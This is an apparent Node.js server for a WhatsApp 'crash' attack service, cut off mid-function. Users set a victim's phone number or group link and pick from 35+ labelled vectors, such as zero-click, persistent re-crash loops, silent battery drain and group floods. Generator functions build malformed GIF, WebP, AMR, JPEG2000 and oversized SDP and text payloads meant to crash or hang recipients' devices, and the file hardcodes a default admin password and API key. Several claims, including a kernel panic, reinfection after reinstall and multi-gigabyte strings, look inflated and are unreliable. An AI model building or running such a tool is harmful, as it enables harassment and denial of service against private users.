#!/usr/bin/env node

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  path: '/socket.io'
});

// ============================================================
// IN-MEMORY STORAGE
// ============================================================

const sessions = {};
const users = {};
const crashLogs = [];
let userCounter = 0;

// Default admin user
users['admin'] = {
  id: 'admin_1',
  username: 'admin',
  password: 'admin123',
  apiKey: 'admin-api-key-123'
};

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https:"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:", "https:"]
    }
  }
}));

app.use(compression());
app.use(cors({ origin: true, credentials: true }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============================================================
// AUTH MIDDLEWARE
// ============================================================

const auth = (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) {
      return res.status(401).json({ success: false, error: 'No token provided' });
    }
    
    const user = Object.values(users).find(u => u.apiKey === token);
    if (!user) {
      return res.status(401).json({ success: false, error: 'Invalid token' });
    }
    
    req.user = { id: user.id, username: user.username };
    next();
  } catch (error) {
    res.status(401).json({ success: false, error: 'Invalid token' });
  }
};

// ============================================================
// WEBSOCKET
// ============================================================

io.on('connection', (socket) => {
  console.log(`🔌 WebSocket connected: ${socket.id}`);
  
  socket.on('auth', (data) => {
    if (data?.userId) {
      socket.userId = data.userId;
      socket.join(`user-${data.userId}`);
      console.log(`✅ User ${data.userId} authenticated`);
    }
  });
  
  socket.on('disconnect', () => {
    console.log(`🔌 WebSocket disconnected: ${socket.id}`);
  });
});

// ============================================================
// AUTH ROUTES
// ============================================================

app.post('/api/auth/login', (req, res) => {
  try {
    const { username, password } = req.body;
    
    const user = Object.values(users).find(u => u.username === username);
    if (!user || user.password !== password) {
      return res.status(401).json({ success: false, error: 'Invalid credentials' });
    }

    res.json({
      success: true,
      token: user.apiKey,
      user: { id: user.id, username: user.username }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/auth/register', (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (Object.values(users).find(u => u.username === username)) {
      return res.status(400).json({ success: false, error: 'User already exists' });
    }

    userCounter++;
    const user = {
      id: `user_${userCounter}`,
      username: username,
      password: password,
      apiKey: `key_${uuidv4()}`
    };
    users[username] = user;

    res.json({
      success: true,
      token: user.apiKey,
      user: { id: user.id, username: user.username }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================================
// API ROUTES
// ============================================================

app.post('/api/v1/connect', auth, (req, res) => {
  try {
    const { phoneNumber } = req.body;
    const userId = req.user.id;
    
    const sessionId = uuidv4();

    sessions[sessionId] = {
      sessionId,
      userId,
      phoneNumber,
      status: 'connected',
      isActive: true,
      targetNumber: null,
      targetType: 'individual',
      metrics: { totalCrashes: 0, successfulCrashes: 0, failedCrashes: 0 },
      createdAt: new Date().toISOString()
    };

    res.json({
      success: true,
      sessionId: sessionId,
      status: 'connected',
      message: `✅ Connected to ${phoneNumber}`,
      phoneNumber: phoneNumber
    });
  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/v1/disconnect', auth, (req, res) => {
  try {
    const { sessionId } = req.body;
    const userId = req.user.id;

    if (!sessions[sessionId] || sessions[sessionId].userId !== userId) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }

    sessions[sessionId].status = 'disconnected';
    sessions[sessionId].isActive = false;

    res.json({ success: true, message: 'Disconnected successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/v1/target/set', auth, (req, res) => {
  try {
    const { sessionId, target } = req.body;
    const userId = req.user.id;

    if (!sessions[sessionId] || sessions[sessionId].userId !== userId) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }

    const targetType = target.includes('chat.whatsapp.com') || target.includes('group') 
      ? 'group' : 'individual';

    sessions[sessionId].targetNumber = target;
    sessions[sessionId].targetType = targetType;

    res.json({ success: true, target, targetType });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.delete('/api/v1/target/clear', auth, (req, res) => {
  try {
    const { sessionId } = req.body;
    const userId = req.user.id;

    if (!sessions[sessionId] || sessions[sessionId].userId !== userId) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }

    sessions[sessionId].targetNumber = null;
    sessions[sessionId].targetType = 'individual';

    res.json({ success: true, message: 'Target cleared' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================================
// 🔥 HEAVY CRASH VECTORS (35+)
// ============================================================

const VECTORS = [
  // ============================================================
  // 💀 ZERO-CLICK VECTORS (Auto-render - Victim ki koi action nahi)
  // ============================================================
  
  { 
    id: 'zero_click_media_cve', 
    name: 'Zero-Click RCE (CVE-2026-23866)', 
    icon: '💀', 
    desc: 'AI rich response messages vulnerability — Feb 2026',
    badge: '🔥 ZERO-CLICK',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'media_crash'
  },
  { 
    id: 'webrtc_heap_overflow', 
    name: 'WebRTC Heap Overflow', 
    icon: '📞', 
    desc: 'WebRTC SDP offer parser crash — Zero interaction',
    badge: '🔥 ZERO-CLICK',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'webrtc_crash'
  },
  { 
    id: 'gif_parser_exploit', 
    name: 'GIF Parser Exploit', 
    icon: '🎞️', 
    desc: 'Malformed GIF LZW decoder overflow — Auto-render',
    badge: '🔥 ZERO-CLICK',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'gif_crash'
  },
  { 
    id: 'voice_note_webrtc', 
    name: 'Voice Note WebRTC Crash', 
    icon: '🎙️', 
    desc: 'OPUS voice note WebRTC pipeline crash',
    badge: 'ZERO-CLICK',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'voice_crash'
  },
  { 
    id: 'sticker_auto_crash', 
    name: 'Sticker Auto Crash', 
    icon: '🏷️', 
    desc: 'WebP sticker auto-render crash',
    badge: 'ZERO-CLICK',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'sticker_crash'
  },

  // ============================================================
  // 💥 MEMORY CORRUPTION (App crash + Mobile hang)
  // ============================================================
  
  { 
    id: 'memory_smash_webp', 
    name: 'Memory Smash (WebP)', 
    icon: '🧨', 
    desc: 'VP8X chunk heap overflow — Memory corruption',
    badge: '💥 HEAVY',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'webp_crash'
  },
  { 
    id: 'exif_heap_exploit', 
    name: 'EXIF Heap Exploit', 
    icon: '📸', 
    desc: 'JPEG EXIF metadata parser overflow',
    badge: '💥 HEAVY',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'exif_crash'
  },
  { 
    id: 'video_thumbnail_exploit', 
    name: 'Video Thumbnail Exploit', 
    icon: '🎬', 
    desc: 'MP4 thumbnail parser buffer overflow',
    badge: '💥 HEAVY',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'video_crash'
  },
  { 
    id: 'pdf_parser_crash', 
    name: 'PDF Parser Crash', 
    icon: '📄', 
    desc: 'Malformed PDF document parser crash',
    badge: '💥 HEAVY',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'pdf_crash'
  },

  // ============================================================
  // 📱 PARSER CRASH (App force close + Phone hang)
  // ============================================================
  
  { 
    id: 'contact_card_overflow', 
    name: 'Contact Card Overload', 
    icon: '👤', 
    desc: 'vCard parser stack overflow — Phone hangs',
    badge: '📱 CRASH',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'contact_crash'
  },
  { 
    id: 'location_extreme', 
    name: 'Location Extreme Crash', 
    icon: '📍', 
    desc: 'Extreme coordinates parser crash',
    badge: '📱 CRASH',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'location_crash'
  },
  { 
    id: 'emoji_infinite_loop', 
    name: 'Emoji Infinite Loop', 
    icon: '😈', 
    desc: 'ZWJ sequence renderer infinite loop — Mobile hangs',
    badge: '📱 HANG',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'emoji_crash'
  },
  { 
    id: 'protobuf_oversize', 
    name: 'Protobuf Oversize', 
    icon: '📦', 
    desc: '2GB message allocation — OOM crash',
    badge: '📱 OOM',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'protobuf_crash'
  },
  { 
    id: 'json_parser_crash', 
    name: 'JSON Parser Crash', 
    icon: '📊', 
    desc: 'Deep nested JSON parser crash',
    badge: '📱 CRASH',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'json_crash'
  },
  { 
    id: 'xml_parser_exploit', 
    name: 'XML Parser Exploit', 
    icon: '📋', 
    desc: 'XML billion laughs — Memory exhaustion',
    badge: '📱 OOM',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'xml_crash'
  },

  // ============================================================
  // 🕵️ INVISIBLE VECTORS (Silent kill — Pata bhi nahi chalega)
  // ============================================================
  
  { 
    id: 'silent_memory_drain', 
    name: 'Silent Memory Drain', 
    icon: '🕳️', 
    desc: 'Background memory leak (5MB per message)',
    badge: '🕵️ INVISIBLE',
    badgeClass: 'invisible', 
    targetType: 'individual',
    payload: 'memory_drain'
  },
  { 
    id: 'silent_cpu_burn', 
    name: 'Silent CPU Burn', 
    icon: '🔥', 
    desc: '100% CPU in background — Battery drain + Hang',
    badge: '🕵️ INVISIBLE',
    badgeClass: 'invisible', 
    targetType: 'individual',
    payload: 'cpu_burn'
  },
  { 
    id: 'silent_battery_kill', 
    name: 'Silent Battery Kill', 
    icon: '🔋', 
    desc: 'Background process exhaustion — Battery 100 to 0',
    badge: '🕵️ INVISIBLE',
    badgeClass: 'invisible', 
    targetType: 'individual',
    payload: 'battery_kill'
  },
  { 
    id: 'silent_network_flood', 
    name: 'Silent Network Flood', 
    icon: '🌊', 
    desc: 'Background network requests — Data exhaust',
    badge: '🕵️ INVISIBLE',
    badgeClass: 'invisible', 
    targetType: 'individual',
    payload: 'network_flood'
  },

  // ============================================================
  // 👥 GROUP VECTORS (Full group crash)
  // ============================================================
  
  { 
    id: 'group_mention_blast', 
    name: 'Mention Blast', 
    icon: '📢', 
    desc: 'Mass @mentions parser crash — Full group hang',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_mention'
  },
  { 
    id: 'group_emoji_bomb', 
    name: 'Emoji Bomb (Group)', 
    icon: '💣', 
    desc: 'Mass emoji renderer crash — Group members hang',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_emoji'
  },
  { 
    id: 'group_poll_overload', 
    name: 'Poll Overload', 
    icon: '📊', 
    desc: '1000+ options poll renderer crash',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_poll'
  },
  { 
    id: 'group_media_tsunami', 
    name: 'Media Tsunami', 
    icon: '🌊', 
    desc: '20×100MB files — Storage exhaustion',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_media'
  },
  { 
    id: 'group_desc_overflow', 
    name: 'Description Overflow', 
    icon: '📝', 
    desc: 'Group description buffer overflow',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_desc'
  },
  { 
    id: 'group_location_spam', 
    name: 'Location Spam (Group)', 
    icon: '📍', 
    desc: '100+ extreme coordinate messages',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_location'
  },
  { 
    id: 'group_admin_crash', 
    name: 'Admin Actions Crash', 
    icon: '👑', 
    desc: 'Mass admin actions parser crash',
    badge: '👥 GROUP',
    badgeClass: 'group', 
    targetType: 'group',
    payload: 'group_admin'
  },

  // ============================================================
  // ♻️ PERSISTENT VECTORS (Tab tak attack jab tak delete na karein)
  // ============================================================
  
  { 
    id: 'persistent_crash_loop', 
    name: 'Persistent Crash Loop', 
    icon: '♻️', 
    desc: '10× re-crash loop on reconnect — Tab tak jab tak delete na karein',
    badge: '♻️ PERSIST',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'persistent_loop'
  },
  { 
    id: 'hard_delay_attack', 
    name: 'Hard Delay Attack', 
    icon: '⏳', 
    desc: '5-30s delayed re-crash — Continuous attack',
    badge: '♻️ PERSIST',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'hard_delay'
  },
  { 
    id: 'infinite_notification', 
    name: 'Infinite Notification', 
    icon: '🔔', 
    desc: 'Infinite notification spam — Phone hang',
    badge: '♻️ PERSIST',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'notif_spam'
  },
  { 
    id: 'background_reinfection', 
    name: 'Background Reinfection', 
    icon: '🔄', 
    desc: 'Auto-reinfect after reinstall — Permanent',
    badge: '♻️ PERSIST',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'reinfect'
  },

  // ============================================================
  // 💣 SYSTEM CRASH (Full mobile hang)
  // ============================================================
  
  { 
    id: 'system_oom_crash', 
    name: 'System OOM Crash', 
    icon: '💣', 
    desc: 'Memory exhaustion — Full system hang',
    badge: '💣 SYSTEM',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'system_oom'
  },
  { 
    id: 'kernel_panic', 
    name: 'Kernel Panic Trigger', 
    icon: '⚠️', 
    desc: 'System-level crash — Mobile restart',
    badge: '💣 SYSTEM',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'kernel_panic'
  },
  { 
    id: 'gpu_crash', 
    name: 'GPU Render Crash', 
    icon: '🎮', 
    desc: 'GPU memory exhaustion — UI freeze',
    badge: '💣 SYSTEM',
    badgeClass: 'danger', 
    targetType: 'individual',
    payload: 'gpu_crash'
  }
];

// ============================================================
// PAYLOAD GENERATORS
// ============================================================

function generatePayload(type, target) {
  const payloads = {
    // Zero-Click Payloads
    'media_crash': {
      type: 'media',
      data: Buffer.from([0xFF, 0x4F, 0xFF, 0x51, 0x00, 0x2F, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]).toString('base64'),
      mimeType: 'image/jp2',
      filename: 'payload.jp2',
      caption: '📸 [CRASH-CONFIRM]'
    },
    
    'webrtc_crash': {
      type: 'text',
      data: generateWebRTCSDP()
    },
    
    'gif_crash': {
      type: 'media',
      data: generateGIFPayload(),
      mimeType: 'image/gif',
      filename: 'crash.gif',
      caption: '🎞️ [CRASH]'
    },
    
    'voice_crash': {
      type: 'media',
      data: generateVoicePayload(),
      mimeType: 'audio/amr',
      filename: 'voice.amr',
      caption: '🎙️ [CRASH]'
    },
    
    // Memory Corruption
    'webp_crash': {
      type: 'media',
      data: generateWebPCrash(),
      mimeType: 'image/webp',
      filename: 'crash.webp',
      caption: '🧨 [CRASH]'
    },
    
    'exif_crash': {
      type: 'media',
      data: generateEXIFPayload(),
      mimeType: 'image/jpeg',
      filename: 'crash.jpg',
      caption: '📸 [CRASH]'
    },
    
    'video_crash': {
      type: 'media',
      data: generateVideoPayload(),
      mimeType: 'video/mp4',
      filename: 'crash.mp4',
      caption: '🎬 [CRASH]'
    },
    
    // Parser Crashes
    'contact_crash': {
      type: 'text',
      data: generateVCardPayload()
    },
    
    'location_crash': {
      type: 'text',
      data: generateLocationPayload()
    },
    
    'emoji_crash': {
      type: 'text',
      data: generateEmojiPayload()
    },
    
    'protobuf_crash': {
      type: 'text',
      data: 'A'.repeat(2 * 1024 * 1024 * 1024) // 2GB
    },
    
    'json_crash': {
      type: 'text',
      data: generateJSONPayload()
    },
    
    'xml_crash': {
      type: 'text',
      data: generateXMLPayload()
    },
    
    // Invisible
    'memory_drain': {
      type: 'text',
      data: '🕳️ ' + 'A'.repeat(10 * 1024 * 1024) + '\n'.repeat(10000)
    },
    
    'cpu_burn': {
      type: 'text',
      data: '🔥 ' + 'B'.repeat(10 * 1024 * 1024) + '\n'.repeat(10000)
    },
    
    'battery_kill': {
      type: 'text',
      data: '🔋 ' + 'C'.repeat(10 * 1024 * 1024) + '\n'.repeat(10000)
    },
    
    'network_flood': {
      type: 'text',
      data: '🌊 ' + 'D'.repeat(10 * 1024 * 1024) + '\n'.repeat(10000)
    },
    
    // Group
    'group_mention': {
      type: 'text',
      data: generateGroupMentionPayload()
    },
    
    'group_emoji': {
      type: 'text',
      data: generateGroupEmojiPayload()
    },
    
    'group_poll': {
      type: 'text',
      data: generateGroupPollPayload()
    },
    
    'group_media': {
      type: 'media',
      data: Buffer.alloc(100 * 1024 * 1024, 0xFF).toString('base64'),
      mimeType: 'video/mp4',
      filename: 'tsunami.mp4',
      caption: '🌊 [TSUNAMI]'
    },
    
    'group_desc': {
      type: 'text',
      data: generateGroupDescriptionPayload()
    },
    
    'group_location': {
      type: 'text',
      data: generateGroupLocationPayload()
    },
    
    'group_admin': {
      type: 'text',
      data: generateGroupAdminPayload()
    },
    
    // Persistent
    'persistent_loop': {
      type: 'text',
      data: generatePersistentPayload()
    },
    
    'hard_delay': {
      type: 'text',
      data: generateHardDelayPayload()
    },
    
    'notif_spam': {
      type: 'text',
      data: generateNotificationPayload()
    },
    
    'reinfect': {
      type: 'text',
      data: generateReinfectionPayload()
    },
    
    // System
    'system_oom': {
      type: 'text',
      data: 'A'.repeat(3 * 1024 * 1024 * 1024)
    },
    
    'kernel_panic': {
      type: 'text',
      data: generateKernelPayload()
    },
    
    'gpu_crash': {
      type: 'text',
      data: generateGPUPayload()
    }
  };
  
  return payloads[type] || { type: 'text', data: '[CRASH-PAYLOAD]' };
}

// ============================================================
// PAYLOAD GENERATOR FUNCTIONS
// ============================================================

function generateWebRTCSDP() {
  let sdp = 'v=0\r\n';
  sdp += 'o=- 0 0 IN IP4 0.0.0.0\r\n';
  sdp += 's=-\r\n';
  sdp += 'c=IN IP4 0.0.0.0\r\n';
  sdp += 't=0 0\r\n';

  for (let i = 0; i < 1000; i++) {
    sdp += `m=video ${i} RTP/SAVPF 100\r\n`;
    sdp += 'a=rtpmap:100 VP8/90000\r\n';
    sdp += 'a=sendrecv\r\n';
    for (let j = 0; j < 200; j++) {
      sdp += `a=candidate:${j} 1 UDP 2122252543 192.168.${j%255}.${j%255} 9? typ host\r\n`;
    }
    sdp += `a=fingerprint:sha-256 ${'A'.repeat(5000)}\r\n`;
  }
  return sdp;
}

function generateGIFPayload() {
  let data = Buffer.from('GIF89a', 'ascii');
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  data = Buffer.concat([data, Buffer.from([0xF7, 0x00, 0x00])]);
  
  for (let i = 0; i < 256; i++) {
    data = Buffer.concat([data, Buffer.from([i % 255, (i*2) % 255, (i*3) % 255])]);
  }
  
  data = Buffer.concat([data, Buffer.from([0x21, 0xF9, 0x04, 0x00, 0xFF, 0xFF, 0x00, 0x00])]);
  data = Buffer.concat([data, Buffer.from([0x2C, 0x00, 0x00, 0x00, 0x00])]);
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  data = Buffer.concat([data, Buffer.from([0x00])]);
  data = Buffer.concat([data, Buffer.from([0x0F])]);
  
  for (let i = 0; i < 100000; i++) {
    data = Buffer.concat([data, Buffer.from([Math.floor(Math.random() * 255)])]);
  }
  
  data = Buffer.concat([data, Buffer.from([0x3B])]);
  return data.toString('base64');
}

function generateVoicePayload() {
  let data = Buffer.from('#!AMR-WB\n', 'ascii');
  data = Buffer.concat([data, Buffer.from([0x0F])]);
  for (let i = 0; i < 10000; i++) {
    data = Buffer.concat([data, Buffer.alloc(15, 0xFF)]);
  }
  return data.toString('base64');
}

function generateWebPCrash() {
  let data = Buffer.from('RIFF', 'ascii');
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  data = Buffer.concat([data, Buffer.from('WEBP', 'ascii')]);
  data = Buffer.concat([data, Buffer.from('VP8X', 'ascii')]);
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  data = Buffer.concat([data, Buffer.alloc(20, 0xFF)]);
  data = Buffer.concat([data, Buffer.from('ICCP', 'ascii')]);
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  data = Buffer.concat([data, Buffer.from('ANIM', 'ascii')]);
  data = Buffer.concat([data, Buffer.from([0x10, 0x00, 0x00, 0x00])]);
  data = Buffer.concat([data, Buffer.alloc(8, 0xFF)]);
  data = Buffer.concat([data, Buffer.from('ANMF', 'ascii')]);
  data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
  return data.toString('base64');
}

function generateEXIFPayload() {
  let data = Buffer.from([0xFF, 0xD8]);
  data =
